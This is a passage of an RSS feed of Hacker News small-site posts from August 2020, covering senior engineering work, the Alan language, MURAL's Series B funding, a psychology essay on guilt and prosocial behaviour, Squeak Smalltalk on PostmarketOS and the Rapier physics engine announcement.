crucial. Tell people what you’re going to build before you build it and let them warn you about any pitfalls before you step into one. If I had shared that design with my manager before building it we would have cancelled the project weeks earlier. And I would have had a relaxing winter break.</p><p>But collecting feedback requires a soft skill: empathy.<strong> </strong>Can you understand why people disagree with you? What are they valuing differently?</p><p>You may not always agree with the feedback, but you have to understand it. Only then can you move forward with a new vision that everyone can get behind.</p><h2 id="build-consensus">Build Consensus</h2><p>Getting that feedback and agreeing on the plan grows more important as your projects get bigger.</p><p>You may start off just having to get your manager to agree (he’s the one who gave you that ambiguous task). But you’ll need to build consensus with the rest of your team and even people outside your team who have a stake in your work. </p><p>This requires communication skills, both to understand and be understood.</p><p>Once I was tasked with creating the next generation of our internal database management system. This was something many teams depended on, and our current solution would stop scaling a year or two down the line. My team had seven different people with eight different opinions about what the system should look like. That included my manager and skip level. Oy vey. </p><p>First step was talking to them all to really understand their concerns and priorities. But there was another voice I wanted to hear from: our customers! This was meant to be a system for other engineering teams, how could I build a solution for them without understanding their problems? &nbsp;It took a bit of digging to even figure out who those users were. This required another soft skill: The art of finding the person you need to talk to.</p><p>Eventually I got into a room with them. There they dropped the bombshell “We can’t really justify the work to migrate to any new system. The current one works well enough for us right now and we have more urgent problems to fix.” I talked to three different teams and got the same answer each time. Damn, what’s the point of building a solution if no one will use it?</p><p>A migration had to happen, soon the current system would stop meeting our reliability standards. There were a couple routes forwards:</p><ul><li><em>Politics</em>: Get my management chain to convince their management chain to force the teams to migrate. Yuck</li><li><em>Persuasion</em>: Teach those teams why this pain that they won’t feel for a few years is more important to fix than the pains they’re facing today. That’s a hard thing to prove, and we’d have to make this case to many, many teams. That doesn’t scale well</li></ul><p>There was a third option: change the constraints. What if I said ‘no’ to some of the features I’d been asked to add? Removing that let me design the system in a way that we could migrate all our customers automatically. There would be zero work required from them to migrate. We’d swap the engine with the car still zooming down the highway.</p><p>This was much more palatable. And by highlighting our user’s push back I convinced the other stakeholders to change drop those constraints as well.</p><figure><img src="https://lh5.googleusercontent.com/uQ8pUq_dwFP6BBDO1d66HKZNGs5DrxtbLCoKc0NxnrsvpHOlh_C_Pi9yUcoU7XLi9TiYkRKy_4QItN3s3pWBVlNCfm2MZYyECTrdEHaJsQVTVxqmV4GPVzEFXJaRxpS5wqloltjj" alt=""></figure><p>That’s the general flow of any project you work on at the senior levels: You research the problem, gather the pieces, understand the world better. You design a solution, collect feedback and adjust course as needed. Then the implementation begins.</p><p>So how do you learn all these skills? Experience. Jump out of the nest and flap your wings. If an opportunity shows up, take it. You won’t feel ready, no one does, but that’s what makes it a learning experience.</p><p>Ask for help. Listen to the answers you get. Keep trying. At the end of the project ask for …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.zainrizvi.io/blog/whats-it-like-as-a-senior-engineer/">https://www.zainrizvi.io/blog/whats-it-like-as-a-senior-engineer/</a></em></p>]]>
            </description>
            <link>https://www.zainrizvi.io/blog/whats-it-like-as-a-senior-engineer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24277414</guid>
            <pubDate>Tue, 25 Aug 2020 23:20:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A programming language to make concurrent programs easy to write]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24277289">thread link</a>) | @pombo
<br/>
August 25, 2020 | https://alan-lang.org/why_alan.html | <a href="https://web.archive.org/web/*/https://alan-lang.org/why_alan.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<!-- Provide site root to javascript -->


<!-- Work around some values being stored in localStorage wrapped in quotes -->


<!-- Hide / unhide sidebar before it is displayed -->


<!-- Old school interval to adjust the carousel status if a carousel is present on this page -->


<nav id="sidebar" aria-label="Table of contents">
  
  
</nav>

<div id="page-wrapper">

    <div class="page">
      
      
        
        
          
        

        <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
        
        <div id="content">
            <main>
                
<p><strong>14 August 2020 | David Ellis, Luis F. De Pombo</strong></p>
<p>We created a programming language to be able to write concurrent algorithms and business logic without having to explicitly program how it should be parallelized. Alan makes people more productive by managing IO and computational parallelism for them in the same way languages from the 90s like Java and Python made people more productive, when compared to C or C++, by managing memory for them.</p>
<p>Why the name? Alan is named in honor of Alan Turing. We find great inspiration in the magnitude of his intellectual contributions.</p>
<h4><a href="#implicit-parallelization-over-arrays-events-and-io" id="implicit-parallelization-over-arrays-events-and-io">Implicit parallelization over arrays, events and IO</a></h4>
<p>Alan is <a href="https://alan-lang.org/alan_overview.html#implicitly-parallel">implicitly parallel</a> because its compiler and runtime exploits opportunities for parallelization across the computing resources available without being told to do so. We have <a href="https://alan-lang.org/alan_overview.html#parallel-computation-and-the-problem-of-turing-completeness">constrained the language a bit</a> to provide better opportunities to do this. This results in nimbler codebases than those built with languages or frameworks that use parallel programming constructs such as threads, actors, channels, locks, futures, promises etc.</p>
<h4><a href="#no-race-conditions-and-fewer-runtime-errors" id="no-race-conditions-and-fewer-runtime-errors">No race conditions and fewer runtime errors</a></h4>
<p>Deadlocks, livelocks, undefined variables, divide-by-zero, integer under/overflow, array out-of-bounds access, etc, are not possible in Alan. Only out-of-memory errors persist, but they are impossible to avoid. This makes Alan codebases easier to maintain and develop in because <a href="https://alan-lang.org/alan_overview.html#statically-compiled-benefits-and-compile-time-safety">runtime errors are nearly always caught at compile time</a>.</p>
<h4><a href="#granular-third-party-permissions" id="granular-third-party-permissions">Granular third party permissions</a></h4>
<p>Alan's module resolution mechanism, with mocking built-in, allows you to <a href="https://alan-lang.org/alan_overview.html#third-party-module-permission-system">prevent specific third-party dependencies from having access to  specific standard libraries</a> that they should not have access to.</p>
<h4><a href="#no-gc-pauses" id="no-gc-pauses">No GC pauses</a></h4>
<p>Alan’s runtime manages memory allocation, access, and deallocation for you like Java, Python, or Javascript. However, Alan’s static event system and <a href="https://alan-lang.org/alan_overview.html#memory-management">automatic event-oriented memory model</a> does so without garbage collector pauses.</p>
<h4><a href="#join-us" id="join-us">Join Us</a></h4>
<p>There is still a ways to go for Alan to become a worthy abstraction to automatically parallelize software, but if you are moved by the vision please try it out, give us your feedback and help us shape it.</p>

            </main>

            <nav aria-label="Page navigation">
              <!-- Mobile navigation buttons -->
              
                <a rel="prev" href="https://alan-lang.org/blog.html" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                  <i></i>
                </a>
              

              
                <a rel="next" href="https://alan-lang.org/alan_overview.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                  <i></i>
                </a>
              

              
            </nav>
        </div>
    </div>

</div>






<!-- Analytics Tag -->



    



    



    
    
    
    
    


<!-- BigInt is not defined in Safari. Define it before loading bundle.js -->

<!-- Custom JS scripts -->

    

    

    







</div>]]>
            </description>
            <link>https://alan-lang.org/why_alan.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24277289</guid>
            <pubDate>Tue, 25 Aug 2020 23:04:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mural Raises $118M Series B to expand remote collaboration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24277265">thread link</a>) | @sebikul
<br/>
August 25, 2020 | https://www.mural.co/press-releases/series-b | <a href="https://web.archive.org/web/*/https://www.mural.co/press-releases/series-b">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Enterprise teams worldwide turn to MURAL to innovate through visual thinking and remote collaboration, driving growth of more than a million monthly active users in Q2 alone and 3x revenue year over year.</em></p><div><p>SAN FRANCISCO, CA — AUGUST 25, 2020 — <a href="http://www.mural.co/">MURAL</a>, the leading digital workspace for visual collaboration in the enterprise, has closed $118 million in Series B funding, led by Insight Partners and joined by Tiger Global, Slack Fund, World Innovation Lab, and existing investor Gradient Ventures. Numerous other investors participated in the funding, including Ryan Smith, CEO and co-founder of Qualtrics; Bill Veghte, CEO of AthenePartners, former Microsoft SVP and former HP COO; and Allison Pickens, former COO of Gainsight. Jeff Lieberman, managing director at Insight Partners, has joined MURAL’s Board of Directors and Insight Partners managing director, Nikhil Sachdev, has joined the Board as an observer.</p><p>“MURAL has repeatedly supported massive implementations and met the exacting specifications of global enterprises,” said Jeff Lieberman of Insight Partners. “The company has shifted from a startup to a scaleup, not only growing revenue through rapid expansion within Fortune 500 companies, but also onboarding new enterprise customers and consulting partners at high velocity. Insight Partners looks forward to helping to accelerate market adoption of MURAL to support the future of team collaboration.”</p><p>Enterprise teams and consulting leaders use MURAL to generate common understanding and solve problems through visual collaboration. More than an online whiteboard, MURAL enables innovation at scale. It is a digital workspace for product strategy and planning, research and design collaboration, facilitated workshops that use agile and design thinking methodologies, and sales and consulting engagements. MURAL integrates with Slack, Microsoft Teams, Dropbox, JIRA, Google Drive, and GitHub, among other platforms.</p><p>The Series B capital will enable MURAL to expand adoption to new types of teams and use cases within enterprises; extend its go-to-market operations globally; accelerate development of new enterprise-ready features; and deepen its community engagement initiatives that support facilitators, design thinkers, and agile experts as they advance the way teams work together.</p><p>“Slack Fund invests in companies that are reinventing the future of work, especially those addressing the unique challenges presented by distributed teams,” said Jason Spinell, director, Slack Fund. “As the system of record for visual productivity, MURAL gives teams the ability to develop ideas in real-time to enhance innovation and collaboration at enterprise scale. We have seen that when integrated with the Slack platform, MURAL’s solution transforms how distributed teams interact and imagine together to get work done.”</p><p>“Imagination at work is key to innovation. The visual methods made popular to collaborate on ideas are here to guide us,” said Mariano Suarez-Battan, MURAL’s co-founder and CEO. “Early adopters in some of the largest organizations in the world realized that they don't need to be in the same room to turn imagination into innovation through visual collaboration. They now feel comfortable doing product strategy, improving processes, and engaging customers remotely. Today, everybody else is rushing to develop this level of remote work fluency. With this funding and the expansion of our team, we are ready to support teams all over the world in their journey."</p><p>MURAL has tripled annual revenue year over year, doubled headcount, and added more than a million monthly active users around the world so far this year. Enterprises such as IBM, Autodesk, Intuit, GitHub, and Atlassian each have up to tens of thousands of MURAL members collaborating with the product each month.</p><p>Learn more about MURAL and try it free for 30 days by visiting <a href="http://www.mural.co/">www.mural.co</a>. In addition, MURAL is offered free for <a href="https://www.mural.co/education">classroom use</a> as well as to consultants through the <a href="https://www.mural.co/consultants">MURAL Consultant Network</a>.<strong>‍</strong></p></div><p>‍</p><p><strong>ABOUT MURAL</strong></p><p><strong>‍</strong>MURAL is the leading digital workspace for visual collaboration in the enterprise. Teams depend on MURAL to understand and solve problems and build consensus using visual methods. More than an online whiteboard, MURAL enables innovation at scale by providing a platform for everything from product strategy and planning to leading immersive workshops using agile and design thinking methodologies. Industry-leading teams at companies including IBM, IDEO, Autodesk, Intuit, GitHub, and Atlassian use MURAL to work together — at any time and from anywhere. Learn more at <a href="https://www.mural.co/">www.mural.co</a>.</p><p>‍</p><p>‍<strong>ABOUT INSIGHT PARTNERS</strong>‍</p><p>Insight Partners is a leading global venture capital and private equity firm investing in high-growth technology and software ScaleUp companies that are driving transformative change in their industries. Founded in 1995, Insight Partners has invested in more than 400 companies worldwide and has raised through a series of funds more than $30 billion in capital commitments. Insight’s mission is to find, fund, and work successfully with visionary executives, providing them with practical, hands-on software expertise to foster long-term success. Across its people and its portfolio, Insight encourages a culture around a belief that ScaleUp companies and growth create opportunity for all. For more information on Insight and all its investments, visit <a href="http://www.insightpartners.com/">www.insightpartners.com</a> or follow us on Twitter @insightpartners.<strong>‍</strong></p><p>‍</p><p><strong>Media Contact:</strong>‍</p><p>Leah Taylor, Public Relations for MURAL<a href="mailto:leaht@mural.co">‍</a></p><p><a href="mailto:leaht@mural.co">leaht@mural.co</a>‍</p><p>Press Kit: <a href="https://tinyurl.com/y5922rcn">https://tinyurl.com/y5922rcn</a><br></p></div></div>]]>
            </description>
            <link>https://www.mural.co/press-releases/series-b</link>
            <guid isPermaLink="false">hacker-news-small-sites-24277265</guid>
            <pubDate>Tue, 25 Aug 2020 23:01:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You want people to do the right thing? Save them the guilt trip]]>
            </title>
            <description>
<![CDATA[
Score 212 | Comments 121 (<a href="https://news.ycombinator.com/item?id=24277190">thread link</a>) | @canada_random1
<br/>
August 25, 2020 | https://psyche.co/ideas/you-want-people-to-do-the-right-thing-save-them-the-guilt-trip | <a href="https://web.archive.org/web/*/https://psyche.co/ideas/you-want-people-to-do-the-right-thing-save-them-the-guilt-trip">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Major global problems </strong>such as racial injustice or climate change often seem insurmountable. Itâ€™s hard to believe that our individual actions can make any real difference. Yet we know that many social dilemmas are overcome only through collective action. They call for people to make behavioural changes without any direct personal benefits â€“ in fact, these changes often come at a personal cost. So what might motivate people to adopt such a â€˜prosocialâ€™ mindset?</p>
<p>Researchers have explored a range of answers to this puzzle. A central line of enquiry relates to emotions and self-perception. Thereâ€™s a close link between emotions and behaviour: feelings motivate us to pursue goals, seek positive reinforcement and avoid punishment. But which emotional route is the most promising â€“ to make people feel bad about their shortcomings, or to encourage them to have a positive self-image because theyâ€™ve done â€˜the right thingâ€™?</p>
<p>There are good arguments both ways. Guilt can be a powerful motivator for action; the feeling of wanting to â€˜make upâ€™ for something can lead to reparative action. On the other hand, feeling good about our actions and what they reflect about who we are can elicit positive emotions. These feelings can then provide us with the energy and mental resources to engage in difficult problems, or to â€˜give to othersâ€™.</p>
<p>Itâ€™s important to distinguish here between guilt that arises internally, and guilt thatâ€™s externally induced. If we feel guilty about failing to recycle our plastics or adopt a vegetarian diet, we might be motivated to engage in reparative action. But if someone buttonholes us over dinner and tries to make us feel bad about our lifestyle choices, the picture might look very different; we might become defensive and try to justify our actions, which drives us further away from changing the way we behave. These scenarios then raise doubts about whether negative self-directed emotional appeals will be effective at promoting prosociality.</p>
<p>In a <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0188781">study</a> that my colleagues and I conducted at Columbia University in New York, we set out to test the consequences of positive versus negative self-directed emotions. Participants were prompted to think about either how guilty they felt about non-environmentally friendly behaviour, or how proud they might be for acting to preserve the environment. They were then asked a range of questions, such as whether they would pay increased rent to have more energy-efficient appliances, how likely they were to take public transport, and whether theyâ€™d be willing to use reusable shopping bags and mugs. Those participants who had been thinking of how proud they would feel about themselves chose to have a higher number of energy-efficient appliances compared with those participants who had been asked to think about personal guilt. Furthermore, participants in the pride group expressed higher intentions to engage in green behaviours compared with those in the guilt group. These findings suggest that inducing people to consider positive rather than negative self-directed emotions might recruit more people to a climate-change mitigation agenda, and to prosocial behaviour more broadly.</p>
<p>This potential advantage â€“ of appealing to positive emotions over negative ones â€“ links up with what we know about human self-perception. Having a positive self-image about who we are and what we do is a fundamental human need. When weâ€™re balanced and on good terms with ourselves, we are more energetic and have greater cognitive and emotional resources. By contrast, when we feel bad about ourselves, itâ€™s much more difficult to be prosocial â€“ especially if those feelings and actions arenâ€™t geared towards friends and family, but a removed, impersonal â€˜greater goodâ€™. Satisfying our important internal needs as emotional creatures can help us free up prosocial resources for others.</p>
<p>Research on self-affirmation supports this picture. In one <a href="https://academiccommons.columbia.edu/doi/10.7916/D84J1XJH">study</a>, we prompted one set of participants to engage in a self-affirming exercise. This involved reflecting on the values and behaviours that were important to them, and that they appreciated in themselves. Another group completed an unrelated exercise, describing the layout of the store at which they shop most frequently. This second â€˜controlâ€™ group allowed us to quantify the effect of the self-affirmation exercise.</p>
<p>Feeling good about ourselves can translate into acts of kindness towards others, for the benefit of society at large</p>
<p>Both groups were entered into a raffle to win a $10 bonus, and were given the option to either keep the money for themselves or to donate all or a portion to a selection of charities with varying missions and beneficiaries. The â€˜affirmationâ€™ group reported feeling more positively about themselves and more at peace with themselves â€“ and whatâ€™s more, these positive self-directed emotions translated into increased levels of charitable giving compared with those participants who had engaged in the unrelated exercise.</p>
<p><strong>My colleagues and</strong> I were curious about whether the effects of a positive self-image would extend to more challenging contexts, such as when the beneficiaries of prosociality were members of a marginalised group. In a field <a href="https://spssi.onlinelibrary.wiley.com/doi/full/10.1111/josi.12374">study</a> in Nigeria, we investigated how the public felt about enhanced social support for ex-prisoners. Like many other nations, Nigeria has high rates of recidivism. Social stigma means that those released from prison often struggle to secure jobs or have a supportive social network, which feeds into a cycle of reoffending. Interventions that reduce stigma and enhance social support can help ex-offenders to successfully reintegrate into society.</p>
<p>For the study, members of the general public in Nigeria were asked to engage in the self-affirming exercise prior to answering a range of survey questions. The results were striking. The self-affirmed participants showed more prosocial intentions and decreased discriminatory tendencies, compared with participants in the control group. They were more comfortable with having an ex-prisoner as their neighbour, for instance, and indicated stronger intentions to help an ex-prisoner whose employer was discriminating against them. They also expressed more willingness to invest personal time and effort to provide social support, such as participating in a tutoring programme for ex-prisoners.</p>
<p>Follow-up research in the United States replicated these results. Obtaining these findings in two studies and two different countries suggests that these effects can be generalised. The fact that a positive self-image can enhance prosociality doesnâ€™t seem to depend on a particular culture but could be an intrinsic part of human behaviour more generally. Feeling good about ourselves doesnâ€™t just enhance individual wellbeing by fulfilling a fundamental human psychological need; it can also translate into acts of kindness towards others, for the benefit of society at large.</p>
<p>A positive self-image can create a flywheel effect, in which the resulting prosocial behaviour sends a social signal to others. If others discriminate less, we are less likely to do so; if people in our social groups recycle more and watch their carbon footprint, we are more likely to do so. Getting a critical mass to â€˜join inâ€™ and acknowledging problems can, over time, help to shift norms â€“ which are drivers, not just inhibitors, of human behaviour.</p>
<p>The potential of positive self-directed emotions has largely not been embraced by activists. The worry could be that it might make those engaging in the cause appear self-satisfied or selfish. But these studies suggest that, instead of focusing on â€˜doom and gloomâ€™ messaging that zooms in on peopleâ€™s shortcomings and risks alienating them, policymakers and strategists might find that positive messaging, speaking to peopleâ€™s positive sense of self, might be a more powerful lever of behavioural change.</p></div></div></div>]]>
            </description>
            <link>https://psyche.co/ideas/you-want-people-to-do-the-right-thing-save-them-the-guilt-trip</link>
            <guid isPermaLink="false">hacker-news-small-sites-24277190</guid>
            <pubDate>Tue, 25 Aug 2020 22:50:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Squeak Smalltalk on a PostmarketOS Cellphone]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24276883">thread link</a>) | @tonyg
<br/>
August 25, 2020 | https://eighty-twenty.org/2020/08/25/postmarketos-smalltalk | <a href="https://web.archive.org/web/*/https://eighty-twenty.org/2020/08/25/postmarketos-smalltalk">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Back in 2007, when <a href="https://en.wikipedia.org/wiki/Openmoko">Openmoko</a>
was first a thing, I
<a href="https://leastfixedpoint.com/tonyg/kcbbs/openmoko-info.html">wrote an Erlang-based userland</a>
that got to the point of being able to take and make calls and receive
and send SMS. The project stalled: the Openmoko GTA01 was too slow,
its power-management too primitive, and Erlang’s GUI facilities too
rudimentary to make further work worthwhile.</p>

<p>Modern cellphone hardware is <em>much</em> more capable. Is it time to have
another run at the idea of a mobile personal computer?</p>

<figure>
<p><a href="https://leastfixedpoint.com/pictures/openmoko-erlang-ui.png"><img src="https://leastfixedpoint.com/pictures/openmoko-erlang-ui.png" alt="Erlang OpenMoko userland (2008)"></a>
Erlang OpenMoko userland (2008)</p>

<p><a href="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213231.jpg"><img src="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213231.jpg" alt="PostmarketOS on my cellphone"></a>
PostmarketOS on my cellphone</p>

<p><a href="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213240.jpg"><img src="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213240.jpg" alt="PostmarketOS Weston demo"></a>
PostmarketOS <a href="https://wiki.postmarketos.org/wiki/Weston">Weston</a> demo</p>

</figure>

<h3 id="postmarketos-is-awesome">PostmarketOS is awesome</h3>

<p>Last week, I installed <a href="http://postmarketos.org/">PostmarketOS</a> on my
previous cellphone, a Samsung Galaxy S7 (using PostmarketOS’s
<a href="https://wiki.postmarketos.org/wiki/Samsung_Galaxy_S7_(samsung-herolte)">samsung-herolte</a>
configuration).</p>

<p>PostmarketOS turns out to be a beautifully engineered system that’s
easy to understand and modify. The basics of kernel and Alpine Linux
userland installed cleanly and easily on the phone, and it’s running
well as a development platform. I’m looking forward to getting into
PostmarketOS more deeply.</p>

<figure>
<p><a href="https://eighty-twenty.org/images/pm-htop-20200825.png"><img src="https://eighty-twenty.org/images/pm-htop-20200825.png" alt="htop running on my cellphone"></a>
<code>htop</code> running on my cellphone. Six cores!</p>
</figure>

<p>Running <code>htop</code> on the phone shows what an <em>amazing</em> little machine it
is! So much power. Loads of cores, lots of RAM. Plenty of space to
explore alternative visions of mobile personal computing.</p>

<p>However, the built-in demos, such as the
<a href="https://wiki.postmarketos.org/wiki/Weston">Weston</a> demo (shown above
at right), currently leave quite a bit to be desired. Perhaps some of
the other
<a href="https://wiki.postmarketos.org/wiki/User-Interfaces">user interface options</a>
included with PostmarketOS could get me closer to a day-to-day usable
cellphone - but I’m interested in running my own software! Let’s get
hacking.</p>

<h3 id="running-my-own-programs">Running my own programs</h3>

<p>PostmarketOS is a plain, clean Alpine Linux distribution. You can SSH
into it initially
<a href="https://wiki.postmarketos.org/wiki/USB_Network">via USB networking</a>.
From there, you can
<a href="https://wiki.postmarketos.org/wiki/WiFi#Using_NetworkManager">configure wifi using nmcli</a>,
set up SSH keys, and then access it directly using SSH over wifi.</p>

<figure>
<p><a href="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213419.jpg"><img src="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213419.jpg" alt="lflow: Framebuffer demo"></a>
<code>lflow</code>: Framebuffer demo</p>
</figure>

<p>Building software is just as simple:</p>

<figure><pre><code data-lang="shell"><span></span>apk add alpine-sdk</code></pre></figure>

<p>To experiment with drawing to the framebuffer and reading touchscreen
input via <code>/dev/input</code>, I compiled and ran an old
<a href="https://github.com/tonyg/mac-display-hacks/blob/a1fde2054f00588076218b76d7ecf34764e5f99e/lflow.c">quick and dirty framebuffer hack</a>
I wrote years ago. The results (shown at left) were encouraging: the
program effortlessly animates tens of thousands of points at 30 frames
per second, responding to touch inputs. Display is via brute-force
pixel output to the <code>mmap</code>‘d frame buffer. It doesn’t even use a full
core.</p>

<p>PostmarketOS turns a phone into a fully capable Linux machine, with
total control over the attached hardware, and with everything
accessible to the developer in the usual places using the usual tools.</p>

<p>But Unix tools are inappropriate for a mobile personal computing
platform. We’ll need something else.</p>

<h3 id="a-smalltalk-phone">A Smalltalk phone</h3>

<figure>
<p><a href="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213500.jpg"><img src="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213500.jpg" alt="Squeak Smalltalk on PostmarketOS"></a>
Squeak Smalltalk
<a href="http://files.squeak.org/6.0alpha/Squeak6.0alpha-19812-64bit/">6.0-alpha</a>
on PostmarketOS</p>
</figure>

<p>Smalltalk could make an ideal basis for a mobile personal computing
platform.</p>

<p>I’ve <a href="https://eighty-twenty.org/tag/smalltalk">enjoyed</a> using,
developing with, and contributing to the
<a href="https://squeak.org/">Squeak Smalltalk</a> implementation since the mid
’00s.</p>

<p>So I compiled the
<a href="https://github.com/OpenSmalltalk/opensmalltalk-vm">Cog Smalltalk VM</a>
on the phone itself, making use of the 64-bit ARM support code that
landed extremely recently.</p>

<p>And lo and behold, it runs! Shown to the right is a bleeding-edge,
fully up-to-date Squeak 6.0-alpha image running on the phone itself.
(<a href="https://eighty-twenty.org/images/postmarketos-samsung-galaxy-s7-herolte-20200825/IMG_20200825_213500.jpg">Click here or on the image to embiggen.</a>)</p>

<p>From here, I can experiment with new ideas using the full power of a
modern Smalltalk environment.</p>

<h3 id="what-next">What next?</h3>

<p>My previous Openmoko experiments foundered, in part, on the GUI aspect
of the system; GTK+ via Erlang was fine for quick prototyping but
wasn’t really up to the task for a day-to-day usable machine.</p>

<p>I recall getting Squeak running on my GTA01, in order to see if it
could provide a viable UI. However, I remember being stymied by the
mismatch between the expectations of the Smalltalk environment and the
realities of the phone.</p>

<p>Squeak wants a mouse and keyboard. It assumes a monitor-sized display,
in everything from widget and font sizes to window management. To work
well on a phone, it needs a touchscreen-based, high-DPI UI in addition
to its existing toolset.</p>

<p>Smalltalk, in both its language aspect and its system design aspect,
also <a href="https://eighty-twenty.org/2011/05/08/weaknesses-of-smalltalk-strengths-of-erlang">suffers from some weaknesses in areas where Erlang shines</a>.</p>

<p>However, in the years since the GTA01:</p>

<ul>
  <li>
    <p>the hardware is much better,</p>
  </li>
  <li>
    <p>the Squeak VM and image are better,</p>
  </li>
  <li>
    <p>I’ve learned a heck of a lot about
<a href="https://syndicate-lang.org/tonyg-dissertation/html/">some good ways to design interactive systems</a>,
and</p>
  </li>
  <li>
    <p>I’ve recently
<a href="https://tonyg.github.io/squeak-actors/">built some tools that help bring Erlang- and Syndicate-style architectural patterns for concurrency to Smalltalk</a>.</p>
  </li>
</ul>

<p>So I think using Erlang/Syndicate-style
<a href="https://tonyg.github.io/squeak-actors/">Actors</a> to structure a
Smalltalk-based phone userland, perhaps with <code>cgroups</code>-based
sub-virtual-machines and images, could work well.</p>

<p>My initial experiments have concentrated on</p>

<ul>
  <li>
    <p>fixing the tiny fonts (the DPI-change support code in the image
needs work, and the support in the VM seems to be absent (?)),</p>
  </li>
  <li>
    <p>reading from the touchscreen (probably
<a href="http://lists.squeakfoundation.org/pipermail/squeak-dev/2016-June/190051.html">like this</a>),</p>
  </li>
  <li>
    <p>thinking about how to structure Actor supervision hierarchies and
<a href="https://syndicate-lang.org/tonyg-dissertation/html/#sec:Syndicate's-approach-to-concurrency">Dataspaces</a>
for a mobile phone (probably borrowing some design elements from my
earlier
<a href="https://github.com/tonyg/erlang-openmoko">Openmoko Erlang-based userland</a>),
and</p>
  </li>
  <li>
    <p>thinking about how to layer a touchscreen (panel-based?) GUI atop
Squeak’s <a href="http://wiki.squeak.org/squeak/morphic">Morphic</a> UI.</p>
  </li>
</ul>

<p>I’ll write more on this blog as things develop.</p>

<hr>

<p><strong>Update:</strong> <a href="https://eighty-twenty.org/2020/08/27/squeak-postmarketos-update">Some progress on the font front!</a></p>

  </div></div>]]>
            </description>
            <link>https://eighty-twenty.org/2020/08/25/postmarketos-smalltalk</link>
            <guid isPermaLink="false">hacker-news-small-sites-24276883</guid>
            <pubDate>Tue, 25 Aug 2020 22:17:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Rapier Physics Engine]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24276785">thread link</a>) | @alex_hirner
<br/>
August 25, 2020 | https://www.dimforge.com/blog/2020/08/25/announcing-the-rapier-physics-engine/ | <a href="https://web.archive.org/web/*/https://www.dimforge.com/blog/2020/08/25/announcing-the-rapier-physics-engine/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>In our announcement last week, we briefly mentioned this new physics engine we have been working on during the past 5 months.
Today we are officially releasing it for the first time: the project <a href="https://rapier.rs/" target="_blank" rel="noopener noreferrer"><strong>Rapier</strong></a>; a set of two 100%
rust libraries <strong>rapier2d</strong> and <strong>rapier3d</strong> for 2D and 3D physics simulations for games, animation, and robotics.</p><p><img src="https://www.dimforge.com/img/rapier_logo_color_textpath_dark.svg" alt="rapier logo"></p><p>This post will be quite long, so here are all the different sections:</p><ul><li><a href="#presenting-rapier">Presenting Rapier</a></li><li><a href="#reaching-out-to-other-communities-bevy-and-javascript">Reaching out to other communities: Bevy and JavaScript</a></li><li><a href="#feature-comparison-with-nphysics">Feature comparison with nphysics</a></li><li><a href="#benchmarks">Benchmarks</a><ul><li><a href="#3d-benchmark-rapier-vs-physx-vs-nphysics">3D Benchmark: Rapier vs. PhysX vs. nphysics</a></li><li><a href="#3d-benchmark-conclusion">3D Benchmark: Conclusion</a></li><li><a href="#2d-benchmark-rapier-vs-box2d-vs-nphysics">2D Benchmark: Rapier vs. Box2D vs. nphysics</a></li><li><a href="#2d-benchmark-conclusion">2D Benchmark: Conclusion</a></li><li><a href="#running-the-benchmarks-yourself">Running the benchmarks yourself</a></li></ul></li><li><a href="#conclusion">Conclusion</a></li></ul><h3>Presenting Rapier</h3><p><strong>Rapier</strong> is the successor of <a href="https://nphysics.org/" target="_blank" rel="noopener noreferrer">nphysics</a> and focuses on performance first.
Just like <strong>nphysics</strong> it is split into two crates: <strong>rapier2d</strong> and <strong>rapier3d</strong> for 2D and 3D physics respectively. It
is designed to be fast and multithreaded right from the beginning. It is also designed to require less incremental compilation
times because the data structures it defines are not generic.</p><p>In release mode, <strong>Rapier</strong> runs 5 to 8 times faster than <strong>nphysics</strong> , making it close to the performance of (the CPU version of) NVidia PhysX
and slightly faster than Box2D as you will see in the <a href="#benchmarks">benchmark sections</a>. <strong>Rapier</strong> is only at its beginning, so many features
are still missing. However some performance optimizations like parallelism, and SIMD have been integrated right from the start.</p><p>There already are a few key features that makes Rapier stand out. Since they may affect compilation times and/or performance,
they are disabled by default and need to be enabled explicitly through cargo features:</p><ol><li><strong>Serialization</strong>: if the <code>serde-serialize</code> feature of <strong>Rapier</strong> is enabled, every physics component will be serializable using <code>serde</code>.
This means that you can take a deep snapshot of the physics state and restore it later. This snapshot can even be saved on
